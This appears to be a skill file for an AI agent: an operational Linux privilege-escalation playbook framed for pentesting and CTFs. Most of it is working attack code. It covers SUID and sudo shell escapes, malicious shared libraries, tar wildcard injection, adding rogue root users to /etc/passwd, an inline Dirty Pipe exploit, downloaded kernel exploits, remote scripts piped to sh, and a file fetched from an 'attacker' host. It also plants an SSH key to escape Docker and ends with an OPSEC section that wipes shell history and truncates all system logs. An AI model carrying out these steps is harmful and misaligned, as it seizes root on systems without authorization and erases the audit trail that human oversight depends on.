---
name: linux-privilege-escalation
description: Escalate from user to root on Linux (SUID, capabilities, sudo, kernel exploits)
version: 1.0.0
author: harezadmm
tags: [linux, privilege-escalation, suid, sudo, kernel-exploit, privesc]
---

# Linux Privilege Escalation

## When to Use
Escalating privileges from standard user to root on Linux systems. Post-exploitation, CTF, penetration testing.

## Prerequisites
- Initial shell access (user-level)
- Linux target system
- Basic Linux knowledge
- SSH or reverse shell

## Attack Vectors

### 1. SUID/SGID Binaries
Files with setuid bit that run as owner (often root).

### 2. Sudo Misconfiguration
Weak sudo rules allowing privilege escalation.

### 3. Capabilities
Linux capabilities assigned to binaries.

### 4. Writable /etc/passwd or /etc/shadow
Direct root password modification.

### 5. Cron Jobs
Scheduled tasks running as root with writable scripts.

### 6. Kernel Exploits
CVE exploits for privilege escalation.

## Procedure

### Step 1: Enumeration

**System information:**
```bash
# User context
whoami
id
groups

# System info
uname -a
cat /etc/os-release
cat /etc/*-release
lsb_release -a

# Kernel version
uname -r

# Architecture
uname -m

# Hostname
hostname

# Network interfaces
ip a
ifconfig

# Routing table
ip route
route

# DNS
cat /etc/resolv.conf

# Users
cat /etc/passwd
cat /etc/shadow  # If readable
getent passwd

# Current processes
ps aux
ps -ef

# Listening services
netstat -tulnp
ss -tulnp
```

**Quick wins check:**
```bash
# Check sudo
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Writable /etc/passwd
ls -la /etc/passwd
test -w /etc/passwd && echo "Writable!"

# Writable /etc/shadow
ls -la /etc/shadow
test -w /etc/shadow && echo "Writable!"

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
systemctl list-timers

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc
find / -perm -222 -type f 2>/dev/null

# Files owned by current user outside home
find / -user $(whoami) -type f 2>/dev/null | grep -v /home/

# SSH keys
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

**Automated enumeration:**
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration (LSE)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l2  # Level 2 checks

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Step 2: SUID Binary Exploitation

**Find SUID binaries:**
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

**Known exploitable SUID binaries:**

**nmap (old versions):**
```bash
# nmap with interactive mode
nmap --interactive
!sh
```

**find:**
```bash
find /home -exec /bin/sh \; -quit
```

**vim:**
```bash
vim -c ':!/bin/sh'
# Or
vim
:set shell=/bin/sh
:shell
```

**awk:**
```bash
awk 'BEGIN {system("/bin/sh")}'
```

**perl:**
```bash
perl -e 'exec "/bin/sh";'
```

**python:**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**less/more:**
```bash
less /etc/passwd
!/bin/sh
```

**cp (copy /etc/shadow):**
```bash
# Generate password hash
openssl passwd -1 -salt pwned password123
# Output: $1$pwned$hash...

# Create malicious passwd file
echo 'root2:$1$pwned$hash...:0:0:root:/root:/bin/bash' >> /tmp/passwd

# Overwrite with cp
cp /tmp/passwd /etc/passwd

# Login
su root2
# Password: password123
```

**Custom SUID exploit (if source available):**
```c
// suid_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc suid_exploit.c -o suid_exploit
chmod +s suid_exploit
./suid_exploit
```

### Step 3: Sudo Exploitation

**Check sudo configuration:**
```bash
sudo -l
```

**Common sudo misconfigurations:**

**Sudo with NOPASSWD:**
```bash
# If allowed to run command without password
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/find

# Exploit
sudo find /home -exec /bin/sh \; -quit
```

**Sudo with LD_PRELOAD:**
```bash
sudo -l
# Output: env_keep+=LD_PRELOAD

# Create malicious shared library
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find
```

**Sudo with LD_LIBRARY_PATH:**
```bash
sudo -l
# Output: env_keep+=LD_LIBRARY_PATH

# Find library used by sudo binary
ldd /usr/bin/apache2
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1

# Create malicious library
cat > libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/libcrypt.so.1 libcrypt.c

# Execute
sudo LD_LIBRARY_PATH=/tmp apache2
```

**Sudo with command-specific bypasses:**

**less/more:**
```bash
sudo less /etc/profile
!/bin/sh
```

**vi/vim:**
```bash
sudo vim -c ':!/bin/sh' /dev/null
```

**git:**
```bash
sudo git -p help
!/bin/sh
```

**man:**
```bash
sudo man man
!/bin/sh
```

**wget (file overwrite):**
```bash
# If sudo wget allowed
# On attacker machine, host malicious passwd
python3 -m http.server 8000

# On target
sudo wget http://attacker:8000/passwd -O /etc/passwd
su root2  # From malicious passwd
```

**tar (wildcard injection):**
```bash
# If script runs: tar -czf backup.tar.gz *
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> shell.sh
chmod +x shell.sh

# Create malicious tar arguments via filenames
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# When tar runs as root with wildcard, executes shell.sh
# Wait for cron or manual execution

# Get root shell
/tmp/rootbash -p
```

### Step 4: Capabilities Exploitation

**Find binaries with capabilities:**
```bash
getcap -r / 2>/dev/null
```

**Exploitable capabilities:**

**cap_setuid:**
```bash
# If python has cap_setuid
getcap /usr/bin/python3.8
# Output: /usr/bin/python3.8 = cap_setuid+ep

# Exploit
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**cap_dac_read_search (read any file):**
```bash
# If tar has cap_dac_read_search
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow

# Crack password hash
john etc/shadow
hashcat -m 1800 etc/shadow wordlist.txt
```

**cap_sys_admin (mount filesystems):**
```bash
# Create malicious SUID binary
cat > shell.c << 'EOF'
int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc shell.c -o shell

# Mount malicious filesystem
mkdir /tmp/mnt
mount -t ext4 /dev/sdb1 /tmp/mnt
cp shell /tmp/mnt/
chmod +s /tmp/mnt/shell

# Execute
/tmp/mnt/shell
```

### Step 5: Writable Files Exploitation

**Writable /etc/passwd:**
```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt evil password123

# Add root user
echo 'evil:$1$evil$hash...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su evil
# Password: password123
```

**Writable /etc/shadow:**
```bash
# Generate SHA-512 hash
python3 -c 'import crypt; print(crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512)))'

# Replace root hash
sed -i 's/^root:[^:]*:/root:$6$generated_hash:/' /etc/shadow

# Login
su root
# Password: password123
```

**Writable cron jobs:**
```bash
# Find writable cron scripts
ls -la /etc/cron*
find /etc/cron* -type f -writable 2>/dev/null

# Edit cron script
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /etc/cron.hourly/backup.sh

# Wait for execution
watch -n 1 'ls -la /tmp/rootbash'

# Get root shell
/tmp/rootbash -p
```

**Writable systemd service:**
```bash
# Find writable services
find /etc/systemd -type f -writable 2>/dev/null

# Edit service
nano /etc/systemd/system/vulnerable.service

[Service]
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'

# Reload and restart
systemctl daemon-reload
systemctl restart vulnerable.service

# Get root shell
/tmp/rootbash -p
```

### Step 6: Kernel Exploits

**Check kernel version:**
```bash
uname -r
uname -a
```

**Common kernel exploits:**

**Dirty COW (CVE-2016-5195):**
```bash
# Works on Linux 2.6.22 - 4.8.3
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123

# New root user "firefart" created
su firefart
# Password: password123
```

**Dirty Pipe (CVE-2022-0847):**
```c
// dirtypipe.c
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    int pipe_fd[2];
    pipe(pipe_fd);
    
    int fd = open("/etc/passwd", O_RDONLY);
    splice(fd, NULL, pipe_fd[1], NULL, 1, 0);
    
    char *payload = "root2::0:0::/root:/bin/bash\n";
    write(pipe_fd[1], payload, strlen(payload));
    
    lseek(fd, 0, SEEK_SET);
    splice(pipe_fd[0], NULL, fd, NULL, strlen(payload), 0);
    
    close(fd);
    printf("[+] /etc/passwd overwritten\n");
    printf("[+] Run: su root2\n");
    return 0;
}
```

```bash
gcc dirtypipe.c -o dirtypipe
./dirtypipe
su root2  # No password
```

**PwnKit (CVE-2021-4034):**
```bash
# Works on polkit before 0.120
wget https://github.com/berdav/CVE-2021-4034/archive/main.zip
unzip main.zip
cd CVE-2021-4034-main
make
./cve-2021-4034

# Root shell
```

### Step 7: Docker Escape (if in container)

**Check if inside container:**
```bash
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv
```

**Privileged container escape:**
```bash
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Add SSH key
mkdir -p /mnt/host/root/.ssh
echo "ssh-rsa AAAA... attacker" >> /mnt/host/root/.ssh/authorized_keys

# SSH to host
ssh root@host_ip
```

**Docker socket mounted:**
```bash
ls -la /var/run/docker.sock

# Spawn privileged container
docker run -v /:/host -it alpine chroot /host bash
```

## Pitfalls

**Detection**: Kernel exploits often crash systems. Test carefully.

**Stability**: Some exploits cause kernel panics.

**Logging**: Commands logged in ~/.bash_history, /var/log/auth.log.

**SELinux/AppArmor**: Mandatory access controls may block exploits.

**Container restrictions**: Limited in containerized environments.

## Verification

```bash
# Check user
whoami
# Should output: root

# Check UID
id
# uid=0(root) gid=0(root) groups=0(root)

# Read shadow
cat /etc/shadow

# Write to protected file
echo "test" > /etc/test
```

## OPSEC

```bash
# Clear bash history
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
find /var/log -type f -exec truncate -s 0 {} \;

# Remove artifacts
rm /tmp/exploit
rm /tmp/rootbash
rm -rf /tmp/*

# Disable history logging
unset HISTFILE
export HISTSIZE=0
```

## References

- GTFOBins (SUID/sudo/capabilities bypass)
- PayloadsAllTheThings Linux PrivEsc
- HackTricks Linux Privilege Escalation
- Basic Linux Privilege Escalation (g0tmi1k)
- Linux Exploit Suggester
